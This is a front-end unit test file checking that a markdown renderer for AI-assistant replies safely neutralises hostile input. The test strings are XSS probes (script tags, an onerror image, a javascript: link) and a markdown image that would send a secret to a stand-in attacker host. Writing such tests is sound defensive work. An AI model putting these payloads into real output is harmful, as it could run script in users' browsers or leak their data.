import { describe, expect, it } from 'vitest'
import { render } from '@testing-library/react'
import { AssistantMarkdown } from '../../../../../../src/core/supporting/authoring-editor/assistant'

describe('AssistantMarkdown', () => {
  it('shows raw HTML as text and runs nothing', () => {
    const { container } = render(<AssistantMarkdown text={'Hi <b>bold</b> <img src=x onerror="alert(1)">\n\n<script>alert(1)</script>'} />)
    expect(container.querySelector('b, img, script')).toBeNull()
    expect(container.textContent).toContain('<script>alert(1)</script>')
    expect(container.textContent).toContain('<b>bold</b>')
  })

  it('never loads images: only their alt text shows', () => {
    const { container } = render(<AssistantMarkdown text="![diagram](https://evil.example/leak?q=secret)" />)
    expect(container.querySelector('img')).toBeNull()
    expect(container.textContent).toBe('[image: diagram]')
  })

  it('shows link addresses, opens them in a new tab without a referrer, and drops other schemes', () => {
    const { container } = render(<AssistantMarkdown text="See [the docs](https://openui.com/docs) and [this](javascript:alert(1)) or https://a.example/x" />)
    const links = [...container.querySelectorAll('a')]
    expect(links.map((a) => a.getAttribute('href'))).toEqual(['https://openui.com/docs', 'https://a.example/x'])
    expect(links[0].getAttribute('target')).toBe('_blank')
    expect(links[0].getAttribute('rel')).toContain('noreferrer')
    expect(container.textContent).toContain('the docs (https://openui.com/docs)')
    expect(container.textContent).toContain('this')
  })

  it('renders lists, tables and highlighted openui-lang code', () => {
    const { container } = render(
      <AssistantMarkdown text={'- one\n- **two**\n\n| a | b |\n|---|---|\n| 1 | 2 |\n\n```oui\nq1 = QuizQuestion("q1", "Why?", [], null)\n```'} />,
    )
    expect(container.querySelectorAll('li')).toHaveLength(2)
    expect(container.querySelector('strong')?.textContent).toBe('two')
    expect(container.querySelectorAll('td')).toHaveLength(2)
    expect(container.querySelector('.ai-tok-component')?.textContent).toBe('QuizQuestion')
    expect(container.querySelector('.ai-tok-string')?.textContent).toBe('"q1"')
    expect(container.querySelector('pre')?.textContent).toBe('q1 = QuizQuestion("q1", "Why?", [], null)')
  })
})
